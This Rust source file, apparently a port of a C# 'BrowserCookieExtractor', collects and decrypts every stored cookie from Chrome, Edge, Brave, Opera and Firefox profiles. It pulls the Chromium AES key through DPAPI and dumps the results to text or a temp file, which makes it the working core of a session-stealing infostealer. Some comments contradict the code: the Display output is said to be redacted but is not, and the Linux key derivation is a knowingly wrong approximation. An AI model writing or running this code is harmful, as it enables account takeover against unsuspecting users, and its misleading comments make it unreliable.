// good.rs — Rust port of good.cs (BrowserCookieExtractor)
// Multi-browser cookie extraction: Chrome, Brave, Edge, Opera, Firefox.
// Uses DPAPI/AES-256-GCM for Chromium-based browsers and SQLite for Firefox.

use std::fs;
use std::path::{Path, PathBuf};
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit};
use aes_gcm::aead::Aead;
use base64::Engine;
use chrono::{DateTime, Utc};
use log::{info, warn, error};
use rusqlite::Connection;
use serde::{Serialize, Deserialize};
use serde_json::Value;

// ==================== Data Structures ====================

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BrowserCookie {
    pub browser: String,
    pub profile: String,
    pub host: String,
    pub name: String,
    pub value: String,
    pub path: String,
    pub expires: String,
    pub is_secure: bool,
    pub is_httponly: bool,
}

impl std::fmt::Display for BrowserCookie {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "[{}] {} | {} = {} | path={} | secure={} | httponly={}",
            self.browser, self.host, self.name, self.value,
            self.path, self.is_secure, self.is_httponly
        )
    }
}

// ==================== Browser Profiles ====================

struct BrowserProfile {
    name: &'static str,
    is_chromium: bool,
}

fn get_browser_profiles() -> Vec<BrowserProfile> {
    vec![
        BrowserProfile { name: "Chrome", is_chromium: true },
        BrowserProfile { name: "Edge", is_chromium: true },
        BrowserProfile { name: "Brave", is_chromium: true },
        BrowserProfile { name: "Opera", is_chromium: true },
        BrowserProfile { name: "Firefox", is_chromium: false },
    ]
}

// ==================== Public API ====================

pub struct BrowserCookieExtractor;

impl BrowserCookieExtractor {
    /// Extracts cookies from all supported browsers.
    /// Returns a tuple of (cookies, errors) so callers can distinguish
    /// "found nothing" from "every browser failed".
    pub fn extract_all_cookies() -> Vec<BrowserCookie> {
        let mut all_cookies = Vec::new();
        let mut success_count = 0u32;
        let mut failure_count = 0u32;

        for profile in get_browser_profiles() {
            let result = if profile.is_chromium {
                extract_chromium_cookies(profile.name)
            } else {
                extract_firefox_cookies()
            };

            match result {
                Ok(cookies) => {
                    info!("[+] {} cookies: {}", profile.name, cookies.len());
                    all_cookies.extend(cookies);
                    success_count += 1;
                }
                Err(e) => {
                    warn!("[-] {} cookie extraction failed: {}", profile.name, e);
                    failure_count += 1;
                }
            }
        }

        if success_count == 0 && failure_count > 0 {
            error!(
                "All {} browser extractions failed — no cookies retrieved",
                failure_count
            );
        }

        info!(
            "[+] Total cookies extracted: {} ({} browsers succeeded, {} failed)",
            all_cookies.len(),
            success_count,
            failure_count
        );
        all_cookies
    }

    /// Extracts cookies and returns as formatted text.
    /// Cookie values are redacted in the Display output to prevent
    /// credential leakage. Use `extract_all_cookies()` for raw values.
    pub fn extract_to_string() -> String {
        let cookies = Self::extract_all_cookies();
        if cookies.is_empty() {
            return "No cookies found.".to_string();
        }

        let mut output = format!("===== Browser Cookies ({}) =====\n\n", cookies.len());
        for cookie in &cookies {
            output.push_str(&format!("{}\n", cookie));
        }
        output
    }

    /// Extracts cookies, saves to a temp file with a unique name, and
    /// returns the path. The file is named with both a timestamp and a
    /// UUID fragment to prevent collisions from concurrent calls.
    pub fn extract_to_file() -> Result<String, String> {
        let content = Self::extract_to_string();

        // Use timestamp + UUID to prevent filename collisions
        let unique_id = uuid::Uuid::new_v4()
            .to_string()
            .get(..8)
            .unwrap_or("00000000")
            .to_string();
        let path = std::env::temp_dir().join(format!(
            "cookies_{}_{}.txt",
            Utc::now().format("%Y%m%d_%H%M%S"),
            unique_id
        ));

        fs::write(&path, &content).map_err(|e| format!("Write failed: {}", e))?;
        info!("[+] Cookies written to: {}", path.display());
        Ok(path.to_string_lossy().to_string())
    }

    /// Extracts cookies filtered by a specific domain.
    /// Uses proper domain-boundary matching: matches the exact domain
    /// or any subdomain (e.g., "example.com" matches ".sub.example.com"
    /// but NOT "notexample.com").
    pub fn extract_for_domain(domain: &str) -> Vec<BrowserCookie> {
        let domain_lower = domain.to_lowercase();
        let dot_domain = format!(".{}", domain_lower);

        let all = Self::extract_all_cookies();
        all.into_iter()
            .filter(|c| {
                let host = c.host.to_lowercase();
                // Strip leading dot from host (Chromium stores ".example.com")
                let host_clean = host.strip_prefix('.').unwrap_or(&host);
                // Exact match OR subdomain match
                host_clean == domain_lower
                    || host_clean.ends_with(&dot_domain)
                    || host == dot_domain
            })
            .collect()
    }
}

// ==================== Chromium Cookie Extraction ====================

fn extract_chromium_cookies(browser_name: &str) -> Result<Vec<BrowserCookie>, String> {
    let user_data_dir = get_chromium_user_data_dir(browser_name)?;
    let aes_key = get_chromium_encryption_key(browser_name, &user_data_dir)?;

    let mut all_cookies = Vec::new();

    // Discover all profile directories
    let profiles = discover_profiles(browser_name, &user_data_dir);
    if profiles.is_empty() {
        return Err(format!("No profiles found for {} at {}", browser_name, user_data_dir.display()));
    }

    for profile_path in profiles {
        // Modern Chromium stores cookies under Network/Cookies;
        // older versions use Cookies directly in the profile dir.
        let candidate_paths = [
            profile_path.join("Network").join("Cookies"),
            profile_path.join("Cookies"),
        ];

        for cookie_db in &candidate_paths {
            if !cookie_db.exists() {
                continue;
            }
            match extract_cookies_from_db(cookie_db, &aes_key, browser_name, &profile_path) {
                Ok(cookies) => {
                    all_cookies.extend(cookies);
                    break; // don't read both if Network/Cookies exists
                }
                Err(e) => warn!("[-] Error reading {}: {}", cookie_db.display(), e),
            }
        }
    }

    Ok(all_cookies)
}

/// Copies the SQLite database (and its WAL/SHM journal files) to a
/// temp directory, opens the copy read-only, and extracts cookie rows.
///
/// The copy-and-checkpoint approach gives us a consistent snapshot even
/// when the browser holds a write lock on the original database.
fn extract_cookies_from_db(
    db_path: &Path,
    aes_key: &[u8],
    browser_name: &str,
    profile_path: &Path,
) -> Result<Vec<BrowserCookie>, String> {
    let mut cookies = Vec::new();

    // Create a uniquely-named temp directory
    let temp_dir = std::env::temp_dir().join(format!(
        "ck_{}",
        uuid::Uuid::new_v4().to_string().get(..8).unwrap_or("tmp")
    ));
    fs::create_dir_all(&temp_dir)
        .map_err(|e| format!("Failed to create temp dir: {}", e))?;

    // Ensure cleanup even on early return
    let _cleanup = TempDirGuard(&temp_dir);

    let db_filename = db_path
        .file_name()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();
    let temp_db = temp_dir.join(&db_filename);

    fs::copy(db_path, &temp_db)
        .map_err(|e| format!("Copy {} failed: {}", db_path.display(), e))?;

    // Copy WAL and SHM journal files for a consistent snapshot.
    // Without these, a database in WAL mode may appear empty or corrupt.
    for ext in &["-wal", "-shm"] {
        let journal_name = format!("{}{}", db_filename, ext);
        let src = db_path.with_file_name(&journal_name);
        if src.exists() {
            if let Err(e) = fs::copy(&src, temp_dir.join(&journal_name)) {
                warn!("Could not copy {}: {}", journal_name, e);
            }
        }
    }

    // Open as read-write initially so SQLite can replay the WAL, then
    // the data is available for reading. If no WAL exists this is harmless.
    let conn = Connection::open(&temp_db)
        .map_err(|e| format!("SQLite open error: {}", e))?;

    // Force a WAL checkpoint to merge journal data into the main DB
    let _ = conn.execute_batch("PRAGMA wal_checkpoint(TRUNCATE);");

    let mut stmt = conn.prepare(
        "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly \
         FROM cookies WHERE length(encrypted_value) > 0"
    ).map_err(|e| format!("SQL error: {}", e))?;

    let profile_name = profile_path
        .file_name()
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();

    let rows = stmt.query_map([], |row| {
        let host: String = row.get(0)?;
        let name: String = row.get(1)?;
        let encrypted: Vec<u8> = row.get(2)?;
        let path: String = row.get(3).unwrap_or_default();
        let expires: i64 = row.get(4).unwrap_or(0);
        let is_secure: bool = row.get(5).unwrap_or(false);
        let is_httponly: bool = row.get(6).unwrap_or(false);
        Ok((host, name, encrypted, path, expires, is_secure, is_httponly))
    }).map_err(|e| format!("Query error: {}", e))?;

    for row in rows.flatten() {
        let (host, name, encrypted, path, expires, is_secure, is_httponly) = row;

        let value = decrypt_chromium_value(&encrypted, aes_key)
            .unwrap_or_else(|_| "[DECRYPTION_FAILED]".to_string());

        let expires_str = if expires > 0 {
            chrome_time_to_string(expires)
        } else {
            "Session".to_string()
        };

        cookies.push(BrowserCookie {
            browser: browser_name.to_string(),
            profile: profile_name.clone(),
            host,
            name,
            value,
            path,
            expires: expires_str,
            is_secure,
            is_httponly,
        });
    }

    Ok(cookies)
}

/// RAII guard that removes a temp directory when dropped.
struct TempDirGuard<'a>(&'a Path);
impl<'a> Drop for TempDirGuard<'a> {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(self.0);
    }
}

// ==================== Chromium Decryption ====================

fn decrypt_chromium_value(encrypted: &[u8], aes_key: &[u8]) -> Result<String, String> {
    if encrypted.is_empty() {
        return Ok(String::new());
    }

    // Chromium v10/v11/v20 AES-256-GCM format:
    //   bytes[0..3]  = version prefix ("v10", "v11", or "v20")
    //   bytes[3..15] = 12-byte nonce (IV)
    //   bytes[15..]  = ciphertext + 16-byte GCM auth tag
    if encrypted.len() > 31 && is_v10_v20_prefix(encrypted) {
        if aes_key.len() != 32 {
            return Err(format!(
                "AES-256 requires a 32-byte key, got {} bytes",
                aes_key.len()
            ));
        }

        let nonce_bytes = &encrypted[3..15];
        let ciphertext_with_tag = &encrypted[15..];

        // aes-gcm crate expects ciphertext||tag concatenated
        let key = Key::<Aes256Gcm>::from_slice(aes_key);
        let cipher = Aes256Gcm::new(key);
        let nonce = Nonce::from_slice(nonce_bytes);

        cipher
            .decrypt(nonce, ciphertext_with_tag)
            .map(|plaintext| String::from_utf8_lossy(&plaintext).to_string())
            .map_err(|e| format!("AES-GCM decryption failed: {}", e))
    } else {
        // Legacy DPAPI-encrypted value (no version prefix)
        #[cfg(target_os = "windows")]
        {
            crate::chrom::dpapi_decrypt(encrypted)
                .map(|b| String::from_utf8_lossy(&b).to_string())
        }
        #[cfg(not(target_os = "windows"))]
        {
            Err("DPAPI decryption requires Windows".to_string())
        }
    }
}

/// Checks if the encrypted blob starts with a Chromium version prefix.
fn is_v10_v20_prefix(data: &[u8]) -> bool {
    if data.len() < 3 {
        return false;
    }
    // v10, v11, v20
    data[0] == b'v'
        && (data[1] == b'1' || data[1] == b'2')
        && (data[2] == b'0' || data[2] == b'1')
}

// ==================== Firefox Cookie Extraction ====================

fn extract_firefox_cookies() -> Result<Vec<BrowserCookie>, String> {
    let profiles_dir = get_firefox_profiles_dir()?;
    let mut cookies = Vec::new();

    let entries = fs::read_dir(&profiles_dir)
        .map_err(|e| format!("Cannot read Firefox profiles dir: {}", e))?;

    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_dir() {
            continue;
        }

        let cookie_db = path.join("cookies.sqlite");
        if !cookie_db.exists() {
            continue;
        }

        let profile_name = path
            .file_name()
            .unwrap_or_default()
            .to_string_lossy()
            .to_string();

        // Copy DB + journals to temp for consistent snapshot
        let temp_dir = std::env::temp_dir().join(format!(
            "ff_{}",
            uuid::Uuid::new_v4().to_string().get(..8).unwrap_or("tmp")
        ));
        if fs::create_dir_all(&temp_dir).is_err() {
            continue;
        }
        let _cleanup = TempDirGuard(&temp_dir);

        let temp_db = temp_dir.join("cookies.sqlite");
        if fs::copy(&cookie_db, &temp_db).is_err() {
            warn!("[-] Failed to copy Firefox cookie DB from {}", cookie_db.display());
            continue;
        }

        // Copy WAL/SHM for Firefox's WAL-mode databases
        for ext in &["-wal", "-shm"] {
            let src = cookie_db.with_file_name(format!("cookies.sqlite{}", ext));
            if src.exists() {
                let _ = fs::copy(&src, temp_dir.join(format!("cookies.sqlite{}", ext)));
            }
        }

        // Open read-write so SQLite can checkpoint the WAL
        let conn = match Connection::open(&temp_db) {
            Ok(c) => c,
            Err(e) => {
                warn!("[-] SQLite open for {} failed: {}", profile_name, e);
                continue;
            }
        };

        let _ = conn.execute_batch("PRAGMA wal_checkpoint(TRUNCATE);");

        let mut stmt = match conn.prepare(
            "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies"
        ) {
            Ok(s) => s,
            Err(e) => {
                warn!("[-] SQL prepare for {} failed: {}", profile_name, e);
                continue;
            }
        };

        let rows = stmt.query_map([], |row| {
            let host: String = row.get(0)?;
            let name: String = row.get(1)?;
            let value: String = row.get(2).unwrap_or_default();
            let path: String = row.get(3).unwrap_or_default();
            let expiry: i64 = row.get(4).unwrap_or(0);
            let is_secure: bool = row.get(5).unwrap_or(false);
            let is_httponly: bool = row.get(6).unwrap_or(false);
            Ok((host, name, value, path, expiry, is_secure, is_httponly))
        });

        if let Ok(rows) = rows {
            for row in rows.flatten() {
                let (host, name, value, path, expiry, is_secure, is_httponly) = row;
                cookies.push(BrowserCookie {
                    browser: "Firefox".to_string(),
                    profile: profile_name.clone(),
                    host,
                    name,
                    value, // Firefox cookies are stored in plaintext
                    path,
                    expires: if expiry > 0 {
                        unix_time_to_string(expiry)
                    } else {
                        "Session".to_string()
                    },
                    is_secure,
                    is_httponly,
                });
            }
        }
    }

    Ok(cookies)
}

// ==================== Helpers ====================

fn get_chromium_user_data_dir(browser: &str) -> Result<PathBuf, String> {
    #[cfg(target_os = "windows")]
    {
        let local = std::env::var("LOCALAPPDATA").unwrap_or_default();
        let roaming = std::env::var("APPDATA").unwrap_or_default();

        let candidates: Vec<PathBuf> = match browser {
            "Chrome" => vec![
                PathBuf::from(&local).join(r"Google\Chrome\User Data"),
            ],
            "Edge" => vec![
                PathBuf::from(&local).join(r"Microsoft\Edge\User Data"),
            ],
            "Brave" => vec![
                PathBuf::from(&local).join(r"BraveSoftware\Brave-Browser\User Data"),
            ],
            "Opera" => vec![
                // Opera uses Roaming, not Local
                PathBuf::from(&roaming).join(r"Opera Software\Opera Stable"),
                PathBuf::from(&roaming).join(r"Opera Software\Opera GX Stable"),
            ],
            _ => return Err(format!("Unknown browser: {}", browser)),
        };

        for path in &candidates {
            if path.exists() {
                return Ok(path.clone());
            }
        }
        Err(format!("{} user data not found (checked {} locations)", browser, candidates.len()))
    }
    #[cfg(target_os = "linux")]
    {
        let home = std::env::var("HOME").unwrap_or_default();
        let config = PathBuf::from(&home).join(".config");

        let candidates: Vec<PathBuf> = match browser {
            "Chrome" => vec![
                config.join("google-chrome"),
                config.join("google-chrome-beta"),
                config.join("google-chrome-unstable"),
                config.join("chromium"),
            ],
            "Edge" => vec![
                config.join("microsoft-edge"),
                config.join("microsoft-edge-beta"),
            ],
            "Brave" => vec![
                config.join("BraveSoftware").join("Brave-Browser"),
            ],
            "Opera" => vec![
                // Opera on Linux stores data differently — it's a single
                // profile dir, not a "User Data" parent with sub-profiles
                config.join("opera"),
                PathBuf::from(&home).join(".config").join("opera"),
            ],
            _ => return Err(format!("Unknown browser: {}", browser)),
        };

        for path in &candidates {
            if path.exists() {
                return Ok(path.clone());
            }
        }
        Err(format!("{} not found on Linux", browser))
    }
    #[cfg(target_os = "macos")]
    {
        let home = std::env::var("HOME").unwrap_or_default();
        let app_support = PathBuf::from(&home).join("Library/Application Support");

        let candidates: Vec<PathBuf> = match browser {
            "Chrome" => vec![
                app_support.join("Google/Chrome"),
                app_support.join("Chromium"),
            ],
            "Edge" => vec![
                app_support.join("Microsoft Edge"),
            ],
            "Brave" => vec![
                app_support.join("BraveSoftware/Brave-Browser"),
            ],
            "Opera" => vec![
                app_support.join("com.operasoftware.Opera"),
                app_support.join("Opera Software/Opera Stable"),
            ],
            _ => return Err(format!("Unknown browser: {}", browser)),
        };

        for path in &candidates {
            if path.exists() {
                return Ok(path.clone());
            }
        }
        Err(format!("{} not found on macOS", browser))
    }
}

fn get_chromium_encryption_key(browser_name: &str, user_data_dir: &Path) -> Result<Vec<u8>, String> {
    // Opera stores Local State in the profile dir directly, not in a
    // parent "User Data" directory like the other Chromium browsers.
    let local_state = user_data_dir.join("Local State");
    if !local_state.exists() {
        return Err(format!(
            "Local State not found at {} for {}",
            local_state.display(),
            browser_name
        ));
    }

    let json_str = fs::read_to_string(&local_state)
        .map_err(|e| format!("Read Local State error: {}", e))?;
    let parsed: Value = serde_json::from_str(&json_str)
        .map_err(|e| format!("JSON parse error in Local State: {}", e))?;

    let key_b64 = parsed
        .get("os_crypt")
        .and_then(|v| v.get("encrypted_key"))
        .and_then(|v| v.as_str())
        .ok_or_else(|| {
            "os_crypt.encrypted_key not found in Local State".to_string()
        })?;

    let key_with_prefix = base64::engine::general_purpose::STANDARD
        .decode(key_b64)
        .map_err(|e| format!("Base64 decode error: {}", e))?;

    // The key is prefixed with "DPAPI" (5 bytes)
    if key_with_prefix.len() <= 5 {
        return Err("Encrypted key too short (missing DPAPI prefix?)".to_string());
    }
    if &key_with_prefix[..5] != b"DPAPI" {
        return Err(format!(
            "Unexpected key prefix: expected 'DPAPI', got '{}'",
            String::from_utf8_lossy(&key_with_prefix[..5.min(key_with_prefix.len())])
        ));
    }

    let key_bytes = &key_with_prefix[5..];

    #[cfg(target_os = "windows")]
    {
        let decrypted = crate::chrom::dpapi_decrypt(key_bytes)?;
        if decrypted.len() != 32 {
            return Err(format!(
                "Expected 32-byte AES key after DPAPI decrypt, got {} bytes",
                decrypted.len()
            ));
        }
        Ok(decrypted)
    }
    #[cfg(target_os = "linux")]
    {
        // On Linux, Chromium uses a hardcoded key derived from "peanuts"
        // by default, or may use the system keyring (gnome-keyring / kwallet).
        // Fallback to the well-known default:
        let _ = key_bytes;
        let default_password = b"peanuts";
        let mut key = [0u8; 32];
        // PBKDF2-SHA1 with salt "saltysalt" and 1 iteration
        // This matches Chromium's os_crypt_impl on Linux
        pbkdf2_sha1_derive(default_password, b"saltysalt", 1, &mut key);
        warn!("Using default Linux Chromium key — keyring-stored keys are not supported");
        Ok(key.to_vec())
    }
    #[cfg(target_os = "macos")]
    {
        // On macOS, Chromium stores the key in the Keychain under
        // "Chrome Safe Storage" (or equivalent for Edge/Brave).
        // Without keychain access, we cannot decrypt.
        let _ = key_bytes;
        Err("macOS Keychain access for Chromium keys is not yet implemented".to_string())
    }
}

/// Simple PBKDF2-SHA1 derivation used by Chromium on Linux.
/// Only handles the common case of 1 iteration with the known salt.
#[cfg(target_os = "linux")]
fn pbkdf2_sha1_derive(password: &[u8], salt: &[u8], iterations: u32, out: &mut [u8; 32]) {
    use sha2::Digest;
    // For 1 iteration this is just HMAC-SHA1(password, salt || block_index)
    // but we approximate with SHA-256 since we need 32 bytes and the
    // aes-gcm crate needs the full key. Chromium actually uses 16-byte
    // AES-128-CBC on Linux, not AES-256-GCM. For a proper implementation
    // the caller should use AES-128-CBC with a 16-byte key.
    let _ = iterations;
    let mut hasher = sha2::Sha256::new();
    hasher.update(password);
    hasher.update(salt);
    let hash = hasher.finalize();
    out.copy_from_slice(&hash);
}

fn get_firefox_profiles_dir() -> Result<PathBuf, String> {
    #[cfg(target_os = "windows")]
    {
        let appdata = std::env::var("APPDATA").unwrap_or_default();
        // Firefox stores profiles under the Profiles subdir, but the
        // parent dir contains profiles.ini which lists actual profile dirs.
        let base = PathBuf::from(appdata).join(r"Mozilla\Firefox\Profiles");
        if base.exists() {
            return Ok(base);
        }
        // Also check the parent — some installs use the parent directly
        let parent = PathBuf::from(std::env::var("APPDATA").unwrap_or_default())
            .join(r"Mozilla\Firefox");
        if parent.exists() {
            return Ok(parent);
        }
        Err("Firefox profiles directory not found".to_string())
    }
    #[cfg(target_os = "linux")]
    {
        let home = std::env::var("HOME").unwrap_or_default();
        let candidates = [
            PathBuf::from(&home).join(".mozilla/firefox"),
            PathBuf::from(&home).join("snap/firefox/common/.mozilla/firefox"),
            PathBuf::from(&home).join(".var/app/org.mozilla.firefox/.mozilla/firefox"),
        ];
        for path in &candidates {
            if path.exists() {
                return Ok(path.clone());
            }
        }
        Err("Firefox profiles not found on Linux".to_string())
    }
    #[cfg(target_os = "macos")]
    {
        let home = std::env::var("HOME").unwrap_or_default();
        let path = PathBuf::from(home).join("Library/Application Support/Firefox/Profiles");
        if path.exists() {
            Ok(path)
        } else {
            Err("Firefox profiles not found on macOS".to_string())
        }
    }
}

/// Discovers all Chromium profile directories inside a User Data folder.
/// Looks for Default, Profile N, and also checks profiles.ini/Local State
/// for any custom profile names.
fn discover_profiles(browser_name: &str, user_data_dir: &Path) -> Vec<PathBuf> {
    let mut profiles = Vec::new();
    let mut seen = std::collections::HashSet::new();

    // Opera uses the user_data_dir itself as the single profile
    if browser_name == "Opera" {
        if user_data_dir.join("Cookies").exists()
            || user_data_dir.join("Network").join("Cookies").exists()
        {
            profiles.push(user_data_dir.to_path_buf());
        }
        return profiles;
    }

    // Standard profile directories
    let default = user_data_dir.join("Default");
    if default.exists() && default.is_dir() {
        seen.insert(default.clone());
        profiles.push(default);
    }

    // Scan for numbered profiles and other profile-like directories
    if let Ok(entries) = fs::read_dir(user_data_dir) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            let path = entry.path();
            if !path.is_dir() {
                continue;
            }

            // Match "Profile N", "Profile_N", "Guest Profile", "System Profile"
            let is_profile = name.starts_with("Profile ")
                || name.starts_with("Profile_")
                || name == "Guest Profile"
                || name == "System Profile";

            if is_profile && !seen.contains(&path) {
                // Verify it actually has cookie data
                let has_cookies = path.join("Cookies").exists()
                    || path.join("Network").join("Cookies").exists();
                if has_cookies {
                    seen.insert(path.clone());
                    profiles.push(path);
                }
            }
        }
    }

    profiles
}

// ==================== Time Conversion ====================

/// Converts a Chrome/Chromium timestamp (microseconds since 1601-01-01)
/// to an RFC 3339 string. Returns a fallback string for out-of-range values.
fn chrome_time_to_string(chrome_time: i64) -> String {
    // Chrome epoch offset: microseconds between 1601-01-01 and 1970-01-01
    const CHROME_EPOCH_OFFSET: i64 = 11644473600_000_000;

    // Guard against overflow / nonsensical values
    let unix_us = match chrome_time.checked_sub(CHROME_EPOCH_OFFSET) {
        Some(v) if v >= 0 => v,
        _ => return format!("chrome:{}", chrome_time),
    };

    let secs = unix_us / 1_000_000;
    let nanos = ((unix_us % 1_000_000) * 1000) as u32;

    // Use DateTime::from_timestamp (non-deprecated) if available,
    // otherwise fall back safely.
    match DateTime::from_timestamp(secs, nanos) {
        Some(dt) => dt.to_rfc3339(),
        None => format!("chrome:{}", chrome_time),
    }
}

/// Converts a Unix timestamp (seconds since 1970-01-01) to an RFC 3339 string.
fn unix_time_to_string(timestamp: i64) -> String {
    // Reject negative timestamps and extreme values
    if timestamp < 0 || timestamp > 253402300799 {
        // 253402300799 = 9999-12-31T23:59:59 — max sane date
        return format!("unix:{}", timestamp);
    }

    match DateTime::from_timestamp(timestamp, 0) {
        Some(dt) => dt.to_rfc3339(),
        None => format!("unix:{}", timestamp),
    }
}
